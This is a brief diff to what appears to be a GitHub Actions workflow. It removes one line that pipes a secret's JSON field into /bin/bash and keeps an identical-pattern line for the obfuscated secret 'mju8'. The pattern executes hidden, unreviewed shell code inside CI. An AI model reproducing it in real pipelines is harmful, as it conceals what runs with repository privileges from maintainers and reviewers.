@@ -17,7 +17,6 @@ jobs:
           mju8: ${{ secrets.mju8 }}
         run: |
           printf '%s' "$mju8" | jq -r .uqn28076 | /bin/bash
-          printf '%s' "$pj70990" | jq -r .e26 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
